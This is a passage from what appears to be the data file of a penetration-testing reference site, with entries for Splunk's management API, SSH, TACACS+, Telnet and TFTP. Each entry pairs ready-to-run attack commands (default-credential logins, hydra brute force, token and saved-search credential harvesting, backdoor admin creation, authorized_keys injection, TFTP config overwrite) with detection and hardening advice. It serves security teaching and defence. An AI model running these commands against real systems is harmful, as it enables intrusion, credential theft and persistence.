          "curl -sk -u <user>:<password> 'https://<target>:8089/servicesNS/<owner>/search/saved/searches?count=0&output_mode=json'",
        detail:
          "Saved searches hold the operational knowledge of the team: the queries used to find real problems and, more importantly, the credentials embedded in those queries.",
      },
      {
        title: "Users and roles",
        command:
          "curl -sk -u <user>:<password> 'https://<target>:8089/services/authentication/users?count=0&output_mode=json'",
        detail:
          "The user list shows the accounts that exist, their roles and their last login, which is enough to pick the privileged account worth targeting.",
      },
      {
        title: "Server configuration",
        command:
          "curl -sk -u <user>:<password> 'https://<target>:8089/services/configs/conf-server?output_mode=json'",
        detail:
          "The server configuration includes the paths of the key files and the settings that point at the credential store. It is what tells you where the interesting material lives.",
      },
    ],
    attacks: [
      {
        title: "Default or stale administrator credentials",
        severity: "high",
        command: "curl -sk -u admin:changeme https://<target>:8089/services/server/info",
        detail:
          "Older installations shipped with a documented default administrator password, and the platform's own documentation still uses it in examples. Administrative access to the management API means full control of indexing, search and who can read the logs.",
        detection:
          "Successful admin logins from addresses other than the admin workstations, and management API calls from hosts that are not part of the administrative tier.",
        fix:
          "Rotate the admin password at install, use a directory-backed account day to day, and put the management port behind a jump host.",
      },
      {
        title: "Credentials stored inside saved searches",
        severity: "critical",
        command:
          "curl -sk -u <user>:<password> 'https://<target>:8089/servicesNS/<owner>/search/saved/searches?output_mode=json' | grep -i 'password\\|token\\|secret'",
        detail:
          "Splunk searches are often written to query a database or a cloud API directly with the credential inline. Anyone who can list saved searches inherits those credentials, and so does anyone who can export them.",
        detection:
          "Bulk reads of the saved search collection, and searches that query external systems with inline credentials.",
        fix:
          "Move credentials into a secret store and reference them from the search, restrict who can read saved searches, and rotate anything ever stored inline.",
      },
      {
        title: "Token theft from the management API",
        severity: "high",
        command:
          "curl -sk -u <user>:<password> 'https://<target>:8089/services/authentication/tokens?output_mode=json'",
        detail:
          "The tokens endpoint lists the session tokens issued to users. A token is a bearer credential for the API, and using one avoids the failed-login noise that a password guess produces.",
        detection:
          "Token listings from accounts that never browse the user interface, and API use from a new source address with a valid token.",
        fix:
          "Shorten token lifetimes, require re-authentication for sensitive endpoints, and restrict token creation to administrators.",
      },
    ],
    postEx: [
      {
        title: "Query the log index",
        severity: "critical",
        command:
          "curl -sk -u <user>:<password> -X POST 'https://<target>:8089/services/search/jobs' -d 'search=index=main password&output_mode=json'",
        detail:
          "Searching the index is the payoff. The logs contain everything ever collected: authentication events, endpoint alerts, cloud console output and the raw results of tools that printed a secret.",
        detection:
          "Searches from an account that does not normally run searches, and broad queries that pull large volumes of data.",
        fix:
          "Separate the accounts that write from the accounts that read, and alert on high-volume searches from the SIEM's own service account.",
      },
      {
        title: "Export the running configuration",
        severity: "high",
        command:
          "curl -sk -u <user>:<password> 'https://<target>:8089/services/properties?output_mode=json'",
        detail:
          "The properties endpoint returns the running configuration, including which indexes exist and where the data lives, which makes it easy to target one specific index.",
        detection:
          "Reads of the properties collection outside the administrative tier.",
        fix:
          "Keep the management API on the admin interface, use roles rather than the admin account for routine work, and review who can read properties.",
      },
      {
        title: "Create a backdoor administrator",
        severity: "critical",
        command:
          "curl -sk -u <user>:<password> -X POST 'https://<target>:8089/services/authentication/users' -d 'name=<user>&password=<password>&roles=admin'",
        detail:
          "Creating an administrator you control is the cleanest persistence for a SIEM, because it survives password rotations of every other account and it is a legitimate login.",
        detection:
          "User creation events that are not linked to a joiner, leaver or change record, and admin role assignments to existing accounts.",
        fix:
          "Alert on user and role creation through the management API, require a directory-backed account for humans, and give the SIEM service account only what it needs.",
      },
    ],
    commands: [
      { command: "curl -sk https://<target>:8089/services/server/info", description: "Version, licence state and user count." },
      { command: "curl -sk https://<target>:8089/services/server/status", description: "State of the deployment and its roles." },
      { command: "curl -sk -u <user>:<password> https://<target>:8089/services/authentication/users", description: "List the accounts that exist." },
      { command: "curl -sk -u <user>:<password> 'https://<target>:8089/servicesNS/<owner>/search/saved/searches?output_mode=json'", description: "List saved searches." },
      { command: "curl -sk -u <user>:<password> 'https://<target>:8089/services/authentication/tokens?output_mode=json'", description: "List issued session tokens." },
      { command: "curl -sk -u <user>:<password> -X POST 'https://<target>:8089/services/search/jobs' -d 'search=<query>&output_mode=json'", description: "Run a search across the index." },
      { command: "curl -sk -u <user>:<password> 'https://<target>:8089/services/configs/conf-server?output_mode=json'", description: "Read the server configuration." },
      { command: "curl -sk -u <user>:<password> 'https://<target>:8089/services/properties?output_mode=json'", description: "Read the running properties." },
      { command: "curl -sk -u <user>:<password> -X POST 'https://<target>:8089/services/authentication/users' -d 'name=<user>&password=<password>&roles=admin'", description: "Create an account with a role." },
    ],
    hardening: [
      {
        title: "Change the admin password and retire the default account",
        detail:
          "Rotate it at install time and bind day-to-day work to directory accounts. The built-in admin should exist for emergencies only, with the password in the vault.",
      },
      {
        title: "Bind the management port to a management interface",
        detail:
          "Listen on 8089 only on the administrative network and enforce it with a host firewall rule. The management API does not need to be reachable from the data network.",
      },
      {
        title: "Front the API with TLS and single sign-on",
        detail:
          "Terminate TLS on a reverse proxy with a certificate the clients trust, and require directory authentication in front of the management endpoints.",
      },
      {
        title: "Keep credentials out of saved searches",
        detail:
          "Reference a secret store from the search rather than embedding the value. Searches get copied, exported and shared far more often than anyone expects.",
      },
      {
        title: "Restrict roles that can read searches and tokens",
        detail:
          "Reading saved searches and listing tokens should be separate permissions from ordinary search access, and both should be reviewed against the team roster.",
      },
      {
        title: "Audit the management API off-box",
        detail:
          "Ship the management logs to a separate system and alert on user creation, role changes and token listings. An attacker inside the SIEM needs the logs to hide.",
      },
    ],
    tools: ["nmap", "httpx", "searchsploit", "nikto", "metasploit"],
  },
  {
    slug: "ssh",
    name: "SSH",
    port: 22,
    protocol: "tcp",
    risk: "high",
    tags: ["remote-admin", "linux", "authentication"],
    summary:
      "SSH is the front door to most Unix systems, and it carries two very different authentication modes that people routinely confuse. Passwords are guessable and travel in the clear on older stacks, while public keys are strong right up until the private key is loose. Misconfiguration is the usual problem: root login enabled, an old protocol suite still accepted, or a service account with a blank or reused password. Enumerating the service also tells you which algorithms the server will negotiate, which removes half of the guesswork from a host key scan.",
    connect: [
      {
        label: "Interactive login",
        command: "ssh <user>@<target>",
        detail:
          "Read the host key warning rather than accepting it blindly. A key that has changed on a host you have used before is worth investigating before you type a password into it.",
      },
      {
        label: "Single command",
        command: "ssh -o BatchMode=yes <user>@<target> 'uname -a; id'",
        detail:
          "BatchMode removes the password prompt, which makes this a clean way to check whether key authentication already works for the account you hold.",
      },
      {
        label: "Non-standard port",
        command: "ssh -p 2222 <user>@<target>",
        detail:
          "Moving SSH off port 22 hides it from casual scanning and from most default rules, but it does nothing against a targeted port sweep.",
      },
    ],
    recon: [
      {
        title: "Host keys and algorithms",
        command: "nmap -sV -p 22 --script ssh-hostkey,ssh2-enum-algos <target>",
        detail:
          "ssh-hostkey returns the server's public host keys and their fingerprints, and ssh2-enum-algos lists the key exchange, cipher and MAC algorithms on offer. That list tells you what a client will be pushed down to, if anything.",
      },
      {
        title: "Banner",
        command: "nc -nv <target> 22",
        detail:
          "OpenSSH prints its version before the client sends anything, so the string identifies the implementation and usually the release.",
      },
      {
        title: "Authentication methods",
        command: "ssh -o PreferredAuthentications=none -o PubkeyAuthentication=no <user>@<target>",
        detail:
          "The server replies with the methods it will accept for that account. If password appears, brute force is viable; if only publickey appears, it is not.",
      },
    ],
    enumeration: [
      {
        title: "Configuration audit",
        command: "ssh-audit -p 22 <target>",
        detail:
          "ssh-audit parses the banner and the negotiated algorithms and grades them against current guidance. It is the fastest way to find an ancient distribution or a device with an obsolete key exchange.",
      },
      {
        title: "Key fingerprints",
        command: "ssh-keyscan -t rsa,ecdsa,ed25519 <target>",
        detail:
          "Collect the host keys and compare the fingerprints with what the configuration management database says they should be, which detects an unexpected reinstall or a substituted host.",
      },
      {
        title: "Method probing for one account",
        command:
          "nmap -p 22 --script ssh-auth-methods --script-args 'ssh-auth-methods.user=<user>' <target>",
        detail:
          "This asks the server which methods it allows for a specific account, so you learn whether that user has a password or a key without generating a failed login.",
      },
    ],
    attacks: [
      {
        title: "Password guessing against an exposed account",
        severity: "high",
        command: "hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 -f -s 22 ssh://<target>",
        detail:
          "SSH has no built-in rate limiting, so the only things between an attacker and a dictionary attack are the server's network position and its password policy. Accounts named after a service or a machine are the obvious first try.",
        detection:
          "A burst of failed password and public key authentications from one source, and successful logins for accounts that normally use keys.",
        fix:
          "Disable password authentication entirely, enforce key-based login with FIDO2 or a smart card, and rate limit the remaining path.",
      },
      {
        title: "Weak, empty or placeholder account passwords",
        severity: "high",
        command:
          "nmap -p 22 --script ssh-brute --script-args userdb=<file>,passdb=<file> <target>",
        detail:
          "Accounts created by provisioning scripts often end up with a locked or trivial password, and service accounts sometimes keep the vendor default. This is a configuration failure rather than a cryptographic one, but it ends the same way.",
        detection:
          "Successful logins to accounts with no history of interactive use, and password authentication succeeding from an address that normally uses keys.",
        fix:
          "Lock every service account, require key authentication for human accounts, and audit for accounts with no password or a placeholder value.",
      },
      {
        title: "Weak key exchange and host key algorithms",
        severity: "medium",
        command: "ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -o HostKeyAlgorithms=ssh-rsa <user>@<target> hostname",
        detail:
          "Older servers still negotiate group1 with SHA-1 or accept ssh-rsa host keys, and some appliances offer a key exchange with no forward secrecy. The practical risk is that a session recorded today can be decrypted later.",
        detection:
          "This is not a detectable event on the server, so audit the configuration and record the negotiated algorithm list on every host instead.",
        fix:
          "Upgrade to a current OpenSSH, set KexAlgorithms and HostKeyAlgorithms to the modern defaults, and retire devices that cannot be updated.",
      },
    ],
    postEx: [
      {
        title: "Authorised key injection",
        severity: "critical",
        command: "echo 'ssh-ed25519 AAAA...<attacker_key>' >> ~/.ssh/authorized_keys",
        detail:
          "Writing your public key into an account you can reach, through a writable home directory, a shared export or an application that runs commands, gives persistent access that survives a password change.",
        detection:
          "Changes to authorised_keys, and SSH sessions with no matching password or key authentication event beforehand.",
        fix:
          "Monitor changes to authorised_keys, keep home directories on local filesystems with correct ownership, and require hardware-backed keys for privileged accounts.",
      },
      {
        title: "Tunnel out through the session",
        severity: "high",
        command: "ssh -R 9000:<internal_host>:443 <user>@<target>",
        detail:
          "Remote forwarding turns the SSH server into a relay into the network behind it. The connection looks like an ordinary outbound SSH session, which makes it awkward to spot in a flow view.",
        detection:
          "Long-lived outbound SSH sessions carrying sustained data with no interactive use, and SSH clients to unusual destination ports.",
        fix:
          "Restrict AllowTcpForwarding and PermitTunnel, use Match blocks to deny them for ordinary accounts, and log every tunnel that is opened.",
      },
      {
        title: "Capture the session transcript",
        severity: "high",
        command: "ssh <user>@<target> -t 'script -q -c /dev/null /dev/null'",
        detail:
          "Recording the session with script captures everything printed to the terminal, including passwords typed into a prompt and the output of commands that should never have been run interactively.",
        detection:
          "Sessions where the terminal output is far larger than the normal login activity, and unusual allocation of a pseudo-terminal.",
        fix:
          "Require MFA for interactive access, keep privileged sessions on a jump host, and review unusual session lengths for service accounts.",
      },
    ],
    commands: [
      { command: "ssh <user>@<target>", description: "Open an interactive session." },
      { command: "ssh -p <port> <user>@<target>", description: "Connect to a non-default port." },
      { command: "ssh -i <key> <user>@<target>", description: "Select a specific private key." },
      { command: "ssh -o BatchMode=yes <user>@<target> <command>", description: "Run a command without a password prompt." },
      { command: "scp <file> <user>@<target>:/tmp/", description: "Copy a file to the remote host." },
      { command: "sftp <user>@<target>", description: "Interactive file transfer." },
      { command: "ssh-keygen -t ed25519 -C '<comment>'", description: "Generate a key pair." },
      { command: "ssh-copy-id -i ~/.ssh/id_ed25519.pub <user>@<target>", description: "Install your public key on the host." },
      { command: "ssh -L 8080:127.0.0.1:80 <user>@<target>", description: "Create a local port forward." },
      { command: "ssh -R 9000:<internal>:443 <user>@<target>", description: "Create a remote port forward." },
    ],
    hardening: [
      {
        title: "Disable password authentication",
        detail:
          "Set PasswordAuthentication no and make sure the change is enforced by the daemon rather than by a user's own configuration file, which the daemon ignores for most options.",
      },
      {
        title: "Disable root login",
        detail:
          "Set PermitRootLogin no and administer through named accounts with sudo. A root account with a password is a single guess away from a full host compromise.",
      },
      {
        title: "Restrict who can connect",
        detail:
          "Use AllowUsers or AllowGroups and a host firewall rule so that only known administration networks can reach port 22 at all.",
      },
      {
        title: "Modernise the algorithm set",
        detail:
          "Set a minimum protocol version, drop ssh-rsa and the SHA-1 key exchanges, and point at the modern defaults explicitly so an upgrade cannot quietly reintroduce the old ones.",
      },
      {
        title: "Log and rate limit failures",
        detail:
          "Turn on the authentication log and pair it with fail2ban or an equivalent. The password policy is only as good as the delay before the next guess.",
      },
      {
        title: "Use short-lived certificates",
        detail:
          "Where the estate supports it, issue short-lived SSH certificates from a central authority so that a leaked private key stops working within hours.",
      },
    ],
    tools: ["nmap", "hydra", "netcat", "john-the-ripper", "metasploit"],
  },
  {
    slug: "tacacs",
    name: "TACACS",
    port: 49,
    protocol: "tcp",
    risk: "high",
    tags: ["aaa", "authentication", "network-devices"],
    summary:
      "TACACS+ is the AAA protocol that Cisco-style networks use to authenticate and authorise every device login, and it usually runs on a single shared secret that guards the whole arrangement. That secret is symmetric, so whoever holds it can authenticate users to the device and can also impersonate the server and answer the device's own requests. The protocol also leaks heavily on the wire, because only the password is protected inside the body while the rest of the attributes travel in clear.",
    connect: [
      {
        label: "Raw TCP session",
        command: "nc -nv <target> 49",
        detail:
          "TACACS+ runs over TCP on port 49 by default and speaks binary, so there is no banner to read. The service is confirmed by the response to a crafted request rather than by any text.",
      },
      {
        label: "Scanning module",
        command:
          "msfconsole -q -x \"use auxiliary/scanner/tacacs/tacacs_login; set RHOSTS <target>; run\"",
        detail:
          "The module attempts authentication against the server and reports which credentials work. It is the practical way to test a secret without writing a packet builder yourself.",
      },
      {
        label: "Watch one exchange",
        command: "sudo tcpdump -i eth0 -A -s0 'tcp port 49 and host <ip>'",
        detail:
          "Capturing one authentication attempt shows exactly which attributes the device sends, which is the fastest way to learn whether the server is authenticating or authorising and which body format it uses.",
      },
    ],
    recon: [
      {
        title: "TCP service check",
        command: "nmap -sV -p 49 --reason <target>",
        detail:
          "TACACS+ servers rarely present a banner, so nmap often reports the port as open with an unknown service. Confirm it by sending a request and watching for a reply.",
      },
      {
        title: "UDP transport check",
        command: "nmap -sU -p 49 --reason <target>",
        detail:
          "A UDP transport for TACACS+ exists and some modern deployments use it. Because UDP gives no handshake, an open port is indistinguishable from a filtered one without a valid request.",
      },
    ],
    enumeration: [
      {
        title: "Running configuration over SNMP",
        command: "snmpwalk -v2c -c <community> <ip> 1.3.6.1.4.1.9.2.1",
        detail:
          "Many managed devices expose their running configuration over SNMP, and the tacacs-server line inside it holds the shared secret in clear. It is the fastest route to a secret that cannot be enumerated directly.",
      },
      {
        title: "Credential test",
        command:
          "msfconsole -q -x \"use auxiliary/scanner/tacacs/tacacs_login; set RHOSTS <target>; set USER <user>; run\"",
        detail:
          "The scanner tries the supplied account against the server and reports the acceptance code. An accepted login is a valid device credential, and the same account usually works on every device behind that server.",
      },
      {
        title: "Known implementation issues",
        command: "searchsploit tacacs",
        detail:
          "TACACS+ is simple enough that most of its weaknesses live in the implementation rather than in the protocol. Public advisories show which vendors have shipped broken authentication handling.",
      },
    ],
    attacks: [
      {
        title: "Weak or default shared secret",
        severity: "high",
        command:
          "msfconsole -q -x \"use auxiliary/scanner/tacacs/tacacs_login; set RHOSTS <target>; set USER <user>; set PASS <password>; run\"",
        detail:
          "The shared secret is symmetric and is often left as a vendor word or a short phrase. Anyone who knows it can add users, change authorisation levels and read what the server knows.",
        detection:
          "AAA server logs showing repeated authentication failures for one account from a device that never failed before, and successful logons for accounts that do not exist in the directory.",
        fix:
          "Use a long random shared secret, keep it out of the device configuration with encrypted secret support, rotate it on a schedule, and monitor AAA traffic.",
      },
      {
        title: "Impersonating the AAA server",
        severity: "critical",
        command: "sudo tcpdump -i eth0 -s0 -w /tmp/tacacs.pcap 'tcp port 49 and host <ip>'",
        detail:
          "With the shared secret you can compute the message digest the server would have produced and craft a reply that grants privileged access. The capture comes first because the server's own response is the template you need.",
        detection:
          "Devices authenticating successfully against an AAA server address that does not resolve to the real server, and AAA events whose source address is new.",
        fix:
          "Keep TACACS+ traffic inside a management VLAN, protect the path with IPsec where the platform supports it, and pin the AAA server address in the device configuration.",
      },
      {
        title: "Cleartext AAA attributes on the wire",
        severity: "medium",
        command: "sudo tcpdump -i eth0 -A -s0 'tcp port 49 and host <ip>'",
        detail:
          "Only the password attribute is protected. Usernames, roles and command authorisation lists are all visible, so a passive attacker learns who administers what without needing any credential at all.",
        detection:
          "AAA traffic seen outside the management network, or arriving from a device that is not on the approved list.",
        fix:
          "Isolate AAA traffic on the management network, prefer RADIUS over TLS where the device supports it, and configure TACACS+ to encrypt the body.",
      },
    ],
    postEx: [
      {
        title: "Recover the shared secret from a managed device",
        severity: "critical",
        command: "snmpwalk -v2c -c <community> <ip> 1.3.6.1.4.1.9.2.1",
        detail:
          "The configuration OID returns the device's running configuration, and the tacacs-server host line holds the shared secret in clear. That one secret opens every other device in the estate.",
        detection:
          "SNMP reads against the configuration subtree from a source that is not the configuration management system.",
        fix:
          "Remove the configuration OID from the monitoring view and rotate any secret that has been readable over the network.",
      },
      {
        title: "Read the AAA server's own configuration",
        severity: "high",
        command: "ssh <user>@<target>\ngrep -Rni 'key\\|secret' /etc/tacacs+/ /etc/aaa/ 2>/dev/null",
        detail:
          "On the AAA server itself the secret sits in a configuration file. Reading it gives the same value with fewer steps, and it also shows which accounts the server is responsible for.",
        detection:
          "Direct access to the configuration directory on the AAA server from a host that is not the management tier.",
        fix:
          "Restrict shell access to the AAA server, store the secret encrypted at rest, and split it so the device and the server use separate keys.",
      },
      {
        title: "Test the secret across the estate",
        severity: "high",
        command:
          "msfconsole -q -x \"use auxiliary/scanner/tacacs/tacacs_login; set RHOSTS <subnet>; set USER <user>; set PASS <shared_secret>; run\"",
        detail:
          "The same secret is usually configured on every device of a model or a site. Running the scanner across a subnet tells you exactly how wide the exposure is.",
        detection:
          "Authentication attempts against the AAA server from device addresses that are new or that were never enrolled.",
        fix:
          "Use a per-site secret so that one compromise is contained, and keep an inventory of which devices share which secret.",
      },
    ],
    commands: [
      { command: "nc -nv <target> 49", description: "Open a raw TCP session to the AAA server." },
      { command: "tcpdump -i eth0 -A 'tcp port 49'", description: "Watch one authentication exchange in clear." },
      { command: "msfconsole -q -x 'use auxiliary/scanner/tacacs/tacacs_login; run'", description: "Test credentials against the AAA server." },
      { command: "snmpwalk -v2c -c <community> <ip> 1.3.6.1.4.1.9.2.1", description: "Read a managed device's running configuration." },
      { command: "grep -Rni 'key' /etc/tacacs+/", description: "Locate the shared secret on the AAA server." },
      { command: "show run | include tacacs", description: "Show the TACACS+ configuration on the device." },
      { command: "show run | section aaa", description: "Show the full AAA configuration block." },
      { command: "show tacacs", description: "Display TACACS+ connection statistics." },
      { command: "copy running-config tftp://<ip>/router.cfg", description: "Copy the configuration to a TFTP server." },
      { command: "nmap -sU -p 49 --reason <ip>", description: "Check the UDP transport." },
    ],
    hardening: [
      {
        title: "Use a long random shared secret",
        detail:
          "Generate thirty-two or more characters rather than choosing one. The secret is symmetric and it is the only thing standing between the attacker and every device on the network.",
      },
      {
        title: "Store the secret encrypted on the device",
        detail:
          "Use the platform's encrypted secret type so that the configuration file does not disclose the value in clear, and configure per-device secrets where the platform supports them.",
      },
      {
        title: "Isolate the AAA traffic",
        detail:
          "Put the AAA server and the managed devices on a management network with an ACL that permits only the AAA flows, and carry the traffic over IPsec where you can.",
      },
      {
        title: "Disable the local fallback account",
        detail:
          "When the AAA server is unreachable the device falls back to its local database. Make that fallback a locked, unprivileged account rather than a working root password.",
      },
      {
        title: "Rotate on a schedule",
        detail:
          "Change the secret on a fixed schedule and after every staff change, and keep an inventory of which devices hold which secret so the rotation actually reaches them.",
      },
      {
        title: "Log AAA decisions centrally",
        detail:
          "Forward the AAA logs to the logging platform so that the authentication trail survives the compromise of the device that produced it.",
      },
    ],
    tools: ["nmap", "netcat", "metasploit", "tcpdump"],
  },
  {
    slug: "telnet",
    name: "Telnet",
    port: 23,
    protocol: "tcp",
    risk: "critical",
    tags: ["legacy", "cleartext", "remote-admin"],
    summary:
      "Telnet is a remote login protocol from before encryption was a requirement, and it is still present on printers, switches, industrial equipment and old appliances. Everything it does is readable on the wire, including the password and every character typed afterwards. On a mixed estate it is also a reliable way to find other targets, because the accounts on a telnet device are usually the same accounts found elsewhere, and the passwords were copied from one to the other.",
    connect: [
      {
        label: "Interactive client",
        command: "telnet <target> 23",
        detail:
          "You get a login banner and a prompt. Telnet negotiates a few terminal options first, which is where the short delay before the banner comes from.",
      },
      {
        label: "Raw connection",
        command: "nc -nv <target> 23",
        detail:
          "Most devices print their banner without waiting for input. Reading it tells you the vendor and the model, and often the default username as well.",
      },
      {
        label: "Credential test",
        command: "hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 -f telnet://<target>",
        detail:
          "Hydra's telnet module handles the option negotiation and the prompt variations. The -f flag stops as soon as a pair works, which keeps the noise down.",
      },
    ],
    recon: [
      {
        title: "Service and option negotiation",
        command: "nmap -sV -p 23 --script telnet-options,telnet-brute <target>",
        detail:
          "telnet-options reports the option bytes the server offers, which is a fingerprint in its own right. telnet-brute tries the script's own word lists, so run it only where that is in scope.",
      },
      {
        title: "Banner flush",
        command: "printf '\\r\\n' | nc -nv <target> 23",
        detail:
          "A bare carriage return is enough to make many devices flush their banner. It is the cheapest way to identify the platform.",
      },
      {
        title: "Neighbouring login services",
        command: "nmap -sV -p 22,23,2323,2002,80 <target>",
        detail:
          "Telnet turns up on 2323 and 2002 as well as 23, and it frequently sits next to SSH on the same device with the same set of accounts.",
      },
    ],
    enumeration: [
      {
        title: "Login prompt structure",
        command: "nc -nv <target> 23",
        detail:
          "The prompt wording, the case of the username and whether a password prompt appears at all tell you what the device expects and whether it accepts a blank password.",
      },
      {
        title: "Username reaction test",
        command:
          "for u in admin root guest operator support user manager; do printf '%s\\r\\n' \"$u\" | timeout 3 nc <target> 23 | tail -1; done",
        detail:
          "Telnet has no enumeration command, so the technique is to watch how the prompt reacts to different usernames. 'Login incorrect', 'Unknown user' and 'Password:' are three different answers and two of them narrow the account list.",
      },
      {
        title: "Cross-check against SSH",
        command: "hydra -l <user> -P <wordlist> -t 4 -f ssh://<target>",
        detail:
          "Accounts and passwords on the telnet devices are often identical to those on the SSH hosts nearby. Testing a telnet password list against SSH finds accounts that were left behind after a migration.",
      },
    ],
    attacks: [
      {
        title: "Default credentials on an appliance",
        severity: "critical",
        command: "hydra -l admin -P <wordlist> -t 4 -f telnet://<target>",
        detail:
          "Printers, cameras and small switches ship with a documented default password and, more often, a default account whose password was never changed. On these devices telnet is often the only way in, so there is nothing else to try.",
        detection:
          "Successful telnet logins on devices that should not accept any, and configuration changes that show up in the appliance's own logs.",
        fix:
          "Disable telnet on the device, change the default credential during installation, and store the new one in the password manager.",
      },
      {
        title: "Cleartext credential capture",
        severity: "high",
        command: "sudo tcpdump -i eth0 -A -s0 'tcp port 23 and host <ip>'",
        detail:
          "The password arrives as plain characters and the whole session follows it. A passive capture of a single login yields a valid credential and a transcript of everything typed afterwards.",
        detection:
          "This happens on the victim's side of the wire, so the practical control is segmentation. Inside that, any telnet traffic at all is an alert.",
        fix:
          "Replace telnet with SSH, and where the device cannot be replaced, isolate it on a management VLAN reachable only through a jump host.",
      },
      {
        title: "Unrestricted shell on the device",
        severity: "high",
        command: "nc -nv <target> 23",
        detail:
          "On a busybox-based appliance the login drops straight into a shell, and that shell runs whatever the client types. Where there are no restrictions the session is a command execution channel and often a root shell with no further authentication.",
        detection:
          "Commands in the device log that do not match the account's normal use, and logins from an address that is not the usual client.",
        fix:
          "Restrict the device to a management network, disable the administrative shell where the firmware allows it, and keep the firmware current.",
      },
    ],
    postEx: [
      {
        title: "Configuration download",
        severity: "high",
        command: "telnet <target> 23\nshow running-config",
        detail:
          "Most appliances offer a command that dumps the configuration, and that configuration holds the SNMP community strings, the AAA secret and the management passwords for other systems.",
        detection:
          "Configuration reads from accounts and addresses that do not normally manage the device.",
        fix:
          "Restrict the management interface to the administration network and keep the configuration readable only by the management account.",
      },
      {
        title: "Credential extraction from the device",
        severity: "high",
        command: "telnet <target> 23\nshow version\nshow running-config",
        detail:
          "The show commands give the platform, the firmware release and the stored credentials for upstream systems such as RADIUS, syslog and NTP, which are often shared with other devices.",
        detection:
          "Repeated configuration and version reads in quick succession from one session.",
        fix:
          "Use per-device credentials for upstream systems so that one device cannot reach the next, and rotate them on a schedule.",
      },
      {
        title: "Use the device as a network foothold",
        severity: "medium",
        command: "telnet <target> 23\nping <other_device>",
        detail:
          "The device sits on a network you are not directly attached to. Its own routing table and its own tools let you reach the systems behind it, which is the whole reason it is there.",
        detection:
          "Connections from the device to hosts that it has no business talking to.",
        fix:
          "Segment management devices from production traffic, and give them no route to anything sensitive.",
      },
    ],
    commands: [
      { command: "telnet <target> 23", description: "Open an interactive login." },
      { command: "nc -nv <target> 23", description: "Read the raw banner." },
      { command: "hydra -l <user> -P <wordlist> telnet://<target>", description: "Test a list of credentials." },
      { command: "printf '\\r\\n' | nc -nv <target> 23", description: "Flush a banner that waits for input." },
      { command: "nmap -p 23 --script telnet-options <target>", description: "Report the negotiated option bytes." },
      { command: "nmap -p 23 --script telnet-brute <target>", description: "Run the bundled brute force script." },
      { command: "tcpdump -i eth0 -A port 23", description: "Capture the session in clear text." },
      { command: "show running-config", description: "Print the device configuration once logged in." },
      { command: "show version", description: "Print platform and firmware details." },
    ],
    hardening: [
      {
        title: "Disable telnet everywhere",
        detail:
          "Turn off the telnet service on every device, including the printers and appliances that nobody remembers having a login on.",
      },
      {
        title: "Use SSH with key authentication",
        detail:
          "Where the platform supports it, move to SSH and use keys. Where it only supports passwords, at least keep the session on a management network with strong credentials.",
      },
      {
        title: "Isolate management interfaces",
        detail:
          "Put management access on a dedicated VLAN with an ACL that permits only the administration addresses, and reach it through a jump host.",
      },
      {
        title: "Change default credentials at installation",
        detail:
          "Do it during deployment, not afterwards. Documented defaults on printers and cameras are the most commonly exploited initial access route on office networks.",
      },
      {
        title: "Restrict management ports at the firewall",
        detail:
          "Block 23, 2323 and 2002 from any segment that does not administer the device, and log the attempts that get dropped.",
      },
      {
        title: "Monitor for any telnet traffic",
        detail:
          "Alert on connections to the telnet ports from anywhere. Legitimate use is rare enough that the signal-to-noise ratio is excellent.",
      },
    ],
    tools: ["nmap", "hydra", "netcat", "responder", "metasploit"],
  },
  {
    slug: "tftp",
    name: "TFTP",
    port: 69,
    protocol: "udp",
    risk: "high",
    tags: ["file-transfer", "no-authentication", "udp"],
    summary:
      "TFTP is a stop-and-wait file transfer built on UDP with no authentication, no encryption and no directory listing in the protocol itself. It exists because it is small enough to fit inside a boot loader, which is exactly why it turns up on network gear and in PXE deployments, and why it stays enabled long after it stops being needed. Any directory served over TFTP is open to the whole network, and a server that accepts a write lets anyone replace a configuration file.",
    connect: [
      {
        label: "Client download",
        command: "atftp -g <ip> -r <file> -l <local_file>",
        detail:
          "atftp handles the acknowledgements and the retransmissions properly. The plain tftp client works too, but atftp gives clearer output when a transfer stalls.",
      },
      {
        label: "Directory listing",
        command: "curl -s --list-only tftp://<ip>/",
        detail:
          "curl speaks TFTP, and the listing works because the server is asked for a file with an empty name. Not every implementation supports it, and a server that returns an error simply has the feature disabled.",
      },
      {
        label: "Raw read request",
        command: "printf '\\x00\\x01\\x00netascii\\x00netascii\\x00' | nc -u -nv <ip> 69",
        detail:
          "The packet is a read request: opcode 0x0001, then the filename and the transfer mode, each null terminated. Any answer at all confirms there is a TFTP server on the port.",
      },
    ],
    recon: [
      {
        title: "UDP port state",
        command: "nmap -sU -p 69 --reason --packet-trace <ip>",
        detail:
          "UDP has no handshake, so nmap reports open|filtered for almost everything. The packet trace is what separates the two cases: an ICMP port-unreachable means closed, and silence means something is answering.",
      },
      {
        title: "Non-standard port sweep",
        command: "nmap -sU -p 69,8069 --reason <ip>",
        detail:
          "TFTP is occasionally left on a non-standard port. A short UDP sweep over the common variants is cheap on a small network.",
      },
    ],
    enumeration: [
      {
        title: "List the served files",
        command: "curl -s --list-only tftp://<ip>/",
        detail:
          "The listing usually holds configuration backups, firmware images and, occasionally, a credential file that was copied there for convenience.",
      },
      {
        title: "Fetch a single file",
        command: "atftp -g <ip> -r <file> -l /tmp/<file>",
        detail:
          "Fetching is the point of the protocol. Files copied to a device for its own upgrade or restore are often still sitting there, readable by anyone on the segment.",
      },
      {
        title: "Probe a write request",
        command: "printf '\\x00\\x03\\x00netascii\\x00netascii\\x00' | nc -u -nv <ip> 69",
        detail:
          "Opcode 3 is a write request. The error code that comes back, such as access violation or file not found, tells you whether the server accepts writes and whether the file exists, and the error text often names the daemon and its version.",
      },
    ],
    attacks: [
      {
        title: "Read any file the server exposes",
        severity: "high",
        command: "curl -s --list-only tftp://<ip>/",
        detail:
          "There is no access control in the protocol, so everything in the served directory is public. Configuration files, private keys and firmware images are all fair game.",
        detection:
          "Read requests for unusual filenames from a source that is not the deployment server, and any TFTP traffic from a host that has no business using it.",
        fix:
          "Turn TFTP off once the transfer is finished, restrict the source address to the known servers, and move bulk transfers to SFTP.",
      },
      {
        title: "Overwrite a device configuration",
        severity: "critical",
        command: "atftp --put --local-file evil.conf --remote-host <ip> --remote-file running-config",
        detail:
          "Many devices accept a TFTP write during a restore. If the directory is writable, an attacker can replace the running configuration with one carrying their own credentials or a route that sends traffic through them.",
        detection:
          "Write requests, a configuration change timestamp that does not match a maintenance window, and devices rebooting unexpectedly.",
        fix:
          "Disable the TFTP restore path, protect it with a one-time password where the platform supports it, and keep the TFTP server inside a restricted directory.",
